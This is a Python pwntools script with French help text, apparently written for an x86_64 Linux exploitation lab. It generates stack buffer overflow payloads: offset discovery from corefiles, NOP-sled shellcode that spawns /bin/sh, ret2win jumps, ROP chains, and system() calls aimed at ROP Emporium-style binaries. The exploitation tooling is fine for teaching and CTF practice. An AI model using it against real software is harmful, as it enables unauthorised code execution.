#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
import shutil
from pathlib import Path

try:
    from pwn import *
    PWNLIB_IMPORT_ERROR = None
except ModuleNotFoundError as exc:
    PWNLIB_IMPORT_ERROR = exc


DEFAULT_TARGET = "./binaries/bin/bof"


def parse_int(value: str) -> int:
    try:
        return int(value, 0)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"invalid integer/address: {value}") from exc


def byte_from_int(value: int) -> bytes:
    if not 0 <= value <= 0xFF:
        raise argparse.ArgumentTypeError("byte values must be between 0x00 and 0xff")
    return bytes([value])


def parse_byte(value: str) -> bytes:
    return byte_from_int(parse_int(value))


def decode_hex_shellcode(data: bytes) -> bytes:
    text = data.decode("utf-8", errors="strict")
    text = re.sub(r"(\\x|0x|[,;])", "", text)
    text = re.sub(r"\s+", "", text)
    if len(text) % 2:
        raise SystemExit("hex shellcode has an odd number of hex digits")
    try:
        return bytes.fromhex(text)
    except ValueError as exc:
        raise SystemExit(f"invalid hex shellcode: {exc}") from exc


def is_probably_text(data: bytes) -> bool:
    if not data:
        return False

    try:
        text = data.decode("utf-8")
    except UnicodeDecodeError:
        return False

    return all(char.isprintable() or char in "\r\n\t" for char in text)


def first_meaningful_script_line(data: bytes) -> str | None:
    if not is_probably_text(data):
        return None

    text = data.decode("utf-8")
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        return line
    return None


def normalize_shell_command(command: str) -> str | None:
    parts = command.split()
    if not parts:
        return None

    if parts[0] == "exec" and len(parts) >= 2:
        parts = parts[1:]

    executable = parts[0]
    if executable in {"sh", "/bin/sh", "/usr/bin/sh"}:
        return "/bin/sh"
    if executable in {"bash", "/bin/bash", "/usr/bin/bash"}:
        return "/bin/bash"
    return None


def shellcode_from_shell_path(path: str) -> bytes:
    if path == "/bin/sh":
        return asm(shellcraft.sh())
    return asm(shellcraft.execve(path, 0, 0))


def detect_shellcode_format(path: Path, selected: str) -> str:
    if selected != "auto":
        return selected

    suffix = path.suffix.lower()
    if suffix in {".asm", ".s"}:
        return "asm"
    if suffix in {".hex", ".txt"}:
        return "hex"
    if suffix in {".sh"}:
        return "text"
    return "raw"


def load_shellcode(path: Path, selected_format: str) -> bytes:
    if not path.is_file():
        raise SystemExit(f"shellcode file not found: {path}")

    data = path.read_bytes()
    shellcode_format = detect_shellcode_format(path, selected_format)

    if shellcode_format == "raw":
        shellcode = data
    elif shellcode_format == "hex":
        shellcode = decode_hex_shellcode(data)
    elif shellcode_format == "asm":
        source = data.decode("utf-8", errors="strict")
        shellcode = asm(source)
    elif shellcode_format == "text":
        command = first_meaningful_script_line(data)
        shell_path = normalize_shell_command(command or "")
        if shell_path is None:
            raise SystemExit(
                f"{path} looks like text, not shellcode. Put raw shellcode bytes, "
                "hex bytes, assembly, or a simple shell path like /bin/sh."
            )
        shellcode = shellcode_from_shell_path(shell_path)
        log.warning(
            "corrected text shell file %s into executable shellcode for %s",
            path,
            shell_path,
        )
    else:
        raise SystemExit(f"unsupported shellcode format: {shellcode_format}")

    if not shellcode:
        raise SystemExit("shellcode is empty")

    log.info("loaded %d bytes of %s shellcode from %s", len(shellcode), shellcode_format, path)
    return shellcode


def process_env(args):
    return {} if args.empty_env else None


def require_pwntools() -> None:
    if PWNLIB_IMPORT_ERROR is not None:
        raise SystemExit(
            "pwntools is required to generate payloads. Install it with: "
            "python3 -m pip install pwntools"
        ) from PWNLIB_IMPORT_ERROR


def core_dir(args) -> Path:
    path = Path(args.core_dir).expanduser()
    if not path.is_absolute():
        path = Path.cwd() / path
    return path.resolve()


def archived_core_path(destination_dir: Path, source: Path) -> Path:
    destination = destination_dir / source.name
    if not destination.exists():
        return destination

    index = 1
    while True:
        candidate = destination_dir / f"{source.name}.{index}"
        if not candidate.exists():
            return candidate
        index += 1


def move_corefile(args, core, label: str) -> None:
    source_value = getattr(core, "path", None)
    if not source_value:
        log.warning("could not find %s corefile path", label)
        return

    source = Path(source_value)
    if not source.exists():
        log.warning("%s corefile is not on disk anymore: %s", label, source)
        return

    destination_dir = core_dir(args)
    destination_dir.mkdir(parents=True, exist_ok=True)
    destination = archived_core_path(destination_dir, source)

    if source.resolve() == destination.resolve():
        log.info("%s corefile already in %s", label, destination_dir)
        return

    shutil.move(str(source), str(destination))
    log.success("moved %s corefile to %s", label, destination)


def target_path(args) -> Path:
    path = Path(args.target).expanduser()
    if not path.is_absolute():
        path = Path.cwd() / path
    return path.resolve()


def target_cwd(args) -> str | None:
    target = target_path(args)
    if args.cwd == "target-dir":
        return str(target.parent)
    if args.cwd == "current":
        return None

    path = Path(args.cwd).expanduser()
    if not path.is_absolute():
        path = Path.cwd() / path
    return str(path.resolve())


def start_target(args, payload: bytes):
    executable = str(target_path(args))
    cwd = target_cwd(args)

    if args.input == "stdin":
        p = process(executable, aslr=args.aslr, env=process_env(args), cwd=cwd)
        if args.stdin_newline:
            p.sendline(payload)
        else:
            p.send(payload)
        return p

    if b"\x00" in payload:
        raise SystemExit("payload contains NUL bytes and cannot be passed through argv")
    return process([executable, payload], aslr=args.aslr, env=process_env(args), cwd=cwd)


def wait_for_crash(args, p, label: str) -> None:
    p.wait_for_close(timeout=args.crash_timeout)
    if p.poll() is None:
        p.close()
        raise SystemExit(
            f"{label} did not crash/exit within {args.crash_timeout} seconds. "
            "If the target reads from stdin, use --input stdin. "
            "Otherwise check --pattern-len or provide --offset manually."
        )


def find_offset(args) -> int:
    pattern = cyclic(args.pattern_len, n=args.cyclic_n)
    if args.cyclic_n > context.bytes:
        raise SystemExit(f"--cyclic-n must be <= pointer size ({context.bytes}) for auto offset")

    log.info("crashing target with cyclic pattern (%d bytes, n=%d)", len(pattern), args.cyclic_n)
    p = start_target(args, pattern)
    wait_for_crash(args, p, "cyclic probe")

    core = p.corefile
    try:
        candidates = [("fault_addr", core.fault_addr), ("pc", core.pc)]

        try:
            candidates.append(("sp_deref", core.unpack(core.sp)))
        except Exception:
            pass

        for name, value in candidates:
            try:
                needle = int(value).to_bytes(context.bytes, context.endian, signed=False)[: args.cyclic_n]
            except (OverflowError, TypeError, ValueError):
                continue

            offset = pattern.find(needle)
            if 0 <= offset < args.pattern_len:
                log.success("offset = %d (%s = %#x)", offset, name, value)
                return offset

        raise SystemExit(
            "could not find a valid offset. Check that the crash overwrites RIP "
            "and increase --pattern-len if needed."
        )
    finally:
        move_corefile(args, core, "cyclic probe")


def get_offset(args) -> int:
    if args.offset is not None:
        log.success("offset = %d (manual)", args.offset)
        return args.offset
    return find_offset(args)


def pack_return_address(address: int, ret_size: int) -> bytes:
    if not 1 <= ret_size <= context.bytes:
        raise SystemExit(f"--ret-size must be between 1 and {context.bytes}")
    return p64(address)[:ret_size]


def get_ret_size(args) -> int:
    if args.ret_size is not None:
        return args.ret_size
    if args.input == "stdin":
        return context.bytes
    return 6


def validate_no_nul_for_argv(payload: bytes, label: str) -> None:
    if b"\x00" in payload:
        raise SystemExit(f"{label} contains NUL bytes and cannot be passed through argv")


def build_shellcode_body(args, offset: int, shellcode: bytes) -> bytes:
    nop_len = offset - len(shellcode) - args.post_shell_padding
    if nop_len < 0:
        raise SystemExit(
            "shellcode + post padding is larger than the offset "
            f"({len(shellcode)} + {args.post_shell_padding} > {offset})"
        )

    body = (args.nop_byte * nop_len) + shellcode + (args.padding_byte * args.post_shell_padding)
    if len(body) != offset:
        raise SystemExit(f"internal error: body length is {len(body)}, expected {offset}")
    return body


def find_shellcode_address(args, body: bytes, shellcode: bytes) -> int:
    probe_payload = body + (args.crash_byte * get_ret_size(args))
    if args.input == "argv":
        validate_no_nul_for_argv(probe_payload, "probe payload")

    log.info("crashing target with probe payload to locate shellcode on the stack")
    p = start_target(args, probe_payload)
    wait_for_crash(args, p, "shellcode probe")
    core = p.corefile

    try:
        matches = [
            address
            for address in core.search(shellcode)
            if core.stack.start <= address < core.stack.stop
        ]

        if not matches:
            raise SystemExit("shellcode was not found on the stack in the corefile")

        address = matches[0]
        log.success("shellcode @ %#x", address)
        return address
    finally:
        move_corefile(args, core, "shellcode probe")


def build_shellcode_payload(args) -> bytes:
    offset = get_offset(args)

    if args.builtin_sh:
        shellcode = asm(shellcraft.sh())
        log.info("using built-in local /bin/sh shellcode (%d bytes)", len(shellcode))
    else:
        shellcode = load_shellcode(Path(args.shellcode_file), args.shellcode_format)

    body = build_shellcode_body(args, offset, shellcode)

    if args.ret_addr is None:
        ret_addr = find_shellcode_address(args, body, shellcode)
    else:
        ret_addr = args.ret_addr
        log.success("return address = %#x (manual)", ret_addr)

    ret = pack_return_address(ret_addr, get_ret_size(args))
    payload = body + ret
    return payload


def build_jump_payload(args) -> bytes:
    offset = get_offset(args)
    ret = pack_return_address(args.addr, get_ret_size(args))
    payload = (args.padding_byte * offset) + ret
    log.success("jump address = %#x", args.addr)
    return payload


def build_chain_payload(args) -> bytes:
    offset = get_offset(args)
    chain = b"".join(p64(address) for address in args.chain_addrs)
    payload = (args.padding_byte * offset) + chain

    for index, address in enumerate(args.chain_addrs):
        log.success("chain[%d] = %#x", index, address)

    return payload


def build_system_payload(args) -> bytes:
    addresses = []
    if args.ret is not None:
        addresses.append(args.ret)
    addresses.extend([args.pop_rdi, args.cmd_addr, args.system_addr])

    args.chain_addrs = addresses
    log.success("system argument string @ %#x", args.cmd_addr)
    log.success("system() @ %#x", args.system_addr)
    return build_chain_payload(args)


def write_payload(path: Path, payload: bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(payload)
    log.success("wrote %d bytes to %s", len(payload), path)


def run_payload(args, payload: bytes) -> None:
    log.info("running final payload")
    p = start_target(args, payload)
    p.interactive()


def build_parser() -> argparse.ArgumentParser:
    common_epilog = """
Modes:
  shellcode  Place du shellcode dans le payload puis saute dessus.
  jump       Ecrase l'adresse de retour avec une seule adresse.
  chain      Construit une chaine ROP brute avec plusieurs adresses.
  system     Appelle system(cmd_addr) avec un gadget pop rdi ; ret.

Aide detaillee par mode:
  python3 payload2.py shellcode -h
  python3 payload2.py jump -h
  python3 payload2.py chain -h
  python3 payload2.py system -h

Exemples:
  # ret2win, entree stdin, offset automatique
  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/ret2win jump --addr 0x400757

  # split: system("/bin/cat flag.txt")
  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/split system \\
    --ret 0x400741 \\
    --pop-rdi 0x4007c3 \\
    --cmd-addr 0x601060 \\
    --system-addr 0x400560

  # shellcode local /bin/sh passe en argv
  python3 payload2.py --run --argv-safe --target ./binaries/bin/bof shellcode --builtin-sh
"""

    parser = argparse.ArgumentParser(
        description=(
            "Generateur de payload pour TP x86_64 Linux. "
            "Par defaut, l'offset est trouve avec cyclic() si --offset n'est pas fourni."
        ),
        epilog=common_epilog,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--target", default=DEFAULT_TARGET, help=f"binaire cible (defaut: {DEFAULT_TARGET})")
    parser.add_argument(
        "--offset",
        type=parse_int,
        help="offset jusqu'a l'adresse de retour; si absent, le script le cherche avec cyclic()",
    )
    parser.add_argument(
        "--pattern-len",
        type=parse_int,
        default=200,
        help="taille du motif cyclic utilise pour trouver l'offset (defaut: 200)",
    )
    parser.add_argument(
        "--cyclic-n",
        type=parse_int,
        default=8,
        help="taille des sous-sequences cyclic; garder 8 en amd64 (defaut: 8)",
    )
    parser.add_argument(
        "--ret-size",
        type=parse_int,
        help="nombre d'octets de l'adresse a ecrire (defaut: 8 en stdin, 6 en argv)",
    )
    parser.add_argument("--padding-byte", type=parse_byte, default=b"A", help="octet de padding, ex: 0x41 pour 'A'")
    parser.add_argument("--nop-byte", type=parse_byte, default=b"\x90", help="octet NOP pour le sled shellcode (defaut: 0x90)")
    parser.add_argument("--crash-byte", type=parse_byte, default=b"A", help="octet utilise pour provoquer le crash de probe")
    parser.add_argument("--output", "-o", default="payload.bin", help="fichier ou ecrire le payload final")
    parser.add_argument("--core-dir", default="core", help="dossier ou deplacer les corefiles apres lecture")
    parser.add_argument(
        "--cwd",
        default="target-dir",
        help="'target-dir' lance depuis le dossier du binaire, 'current' depuis le dossier courant, ou chemin custom",
    )
    parser.add_argument("--input", choices=("argv", "stdin"), default="argv", help="envoie le payload en argument argv ou sur stdin")
    parser.add_argument("--stdin-newline", action="store_true", help="ajoute un '\\n' apres le payload envoye sur stdin")
    parser.add_argument("--crash-timeout", type=float, default=5.0, help="secondes max d'attente pour les crashs de probe")
    parser.add_argument("--aslr", action="store_true", help="laisse l'ASLR activee; par defaut pwntools la desactive")
    parser.add_argument("--empty-env", action="store_true", help="lance la cible avec un environnement vide")
    parser.add_argument("--argv-safe", action="store_true", help="refuse le payload final s'il contient des octets NUL")
    parser.add_argument("--run", action="store_true", help="execute la cible avec le payload final apres generation")
    parser.add_argument("--no-hexdump", action="store_true", help="n'affiche pas l'hexdump du payload final")
    parser.add_argument("--checksec", action="store_true", help="affiche les protections du binaire via pwntools")

    subparsers = parser.add_subparsers(dest="mode", required=True, metavar="{shellcode,jump,chain,system}")

    shellcode_parser = subparsers.add_parser(
        "shellcode",
        help="embarque du shellcode dans le payload",
        description="Construit un payload qui place du shellcode avant l'adresse de retour puis saute dessus.",
        epilog="""
Exemples:
  python3 payload2.py --run --argv-safe shellcode --builtin-sh
  python3 payload2.py --run --argv-safe shellcode --shellcode-file shell.asm --shellcode-format asm
  python3 payload2.py shellcode --shellcode-file sc.bin --shellcode-format raw
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    shellcode_source = shellcode_parser.add_mutually_exclusive_group(required=True)
    shellcode_source.add_argument("--shellcode-file", help="fichier contenant du shellcode raw, hex, asm ou texte .sh")
    shellcode_source.add_argument("--builtin-sh", action="store_true", help="utilise le shellcode pwntools /bin/sh local")
    shellcode_parser.add_argument(
        "--shellcode-format",
        choices=("auto", "raw", "hex", "asm", "text"),
        default="auto",
        help="format du fichier: auto, raw, hex, asm, text",
    )
    shellcode_parser.add_argument(
        "--post-shell-padding",
        type=parse_int,
        default=56,
        help="padding place apres le shellcode avant l'adresse de retour (defaut: 56)",
    )
    shellcode_parser.add_argument("--ret-addr", type=parse_int, help="adresse de retour manuelle vers le shellcode")
    shellcode_parser.set_defaults(builder=build_shellcode_payload)

    jump_parser = subparsers.add_parser(
        "jump",
        help="saute directement vers une adresse",
        description="Construit padding + adresse. Utile pour ret2win ou une fonction simple.",
        epilog="""
Exemples:
  python3 payload2.py --run --input stdin --target ./ret2win jump --addr 0x400757
  python3 payload2.py --offset 40 jump --addr 0x400757
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    jump_parser.add_argument("--addr", type=parse_int, required=True, help="adresse vers laquelle rediriger RIP")
    jump_parser.set_defaults(builder=build_jump_payload)

    chain_parser = subparsers.add_parser(
        "chain",
        help="construit une chaine ROP brute",
        description="Construit padding + adresses donnees dans l'ordre. Repeter --addr pour chaque element.",
        epilog="""
Exemple:
  python3 payload2.py --run --input stdin chain \\
    --addr 0x400741 \\
    --addr 0x4007c3 \\
    --addr 0x601060 \\
    --addr 0x400560
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    chain_parser.add_argument(
        "--addr",
        dest="chain_addrs",
        type=parse_int,
        action="append",
        required=True,
        help="adresse a ajouter a la chaine; repeter pour chaque gadget/fonction/valeur",
    )
    chain_parser.set_defaults(builder=build_chain_payload)

    system_parser = subparsers.add_parser(
        "system",
        help="appelle system(cmd_addr) via pop rdi ; ret",
        description="Construit une chaine ROP pour appeler system() avec une chaine deja presente en memoire.",
        epilog="""
Exemple split:
  python3 payload2.py --run --input stdin --target ./split system \\
    --ret 0x400741 \\
    --pop-rdi 0x4007c3 \\
    --cmd-addr 0x601060 \\
    --system-addr 0x400560

Trouver les adresses:
  ROPgadget --binary ./split | grep "pop rdi"
  rabin2 -z ./split | grep "cat flag"
  objdump -d ./split | grep system@plt
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    system_parser.add_argument("--pop-rdi", type=parse_int, required=True, help="adresse du gadget pop rdi ; ret")
    system_parser.add_argument("--cmd-addr", type=parse_int, required=True, help="adresse de la chaine commande, ex: /bin/cat flag.txt")
    system_parser.add_argument("--system-addr", type=parse_int, required=True, help="adresse de system@plt ou system")
    system_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel pour realigner la stack")
    system_parser.set_defaults(builder=build_system_payload)

    return parser


def main() -> None:
    args = build_parser().parse_args()
    require_pwntools()

    context.update(arch="amd64", os="linux")
    context.log_level = "info"
    context.binary = elf = ELF(args.target)

    if args.checksec:
        log.info("\n%s", elf.checksec())

    payload = args.builder(args)
    if args.argv_safe:
        validate_no_nul_for_argv(payload, "final payload")

    write_payload(Path(args.output), payload)

    if not args.no_hexdump:
        print(hexdump(payload))

    if args.run:
        run_payload(args, payload)


if __name__ == "__main__":
    main()

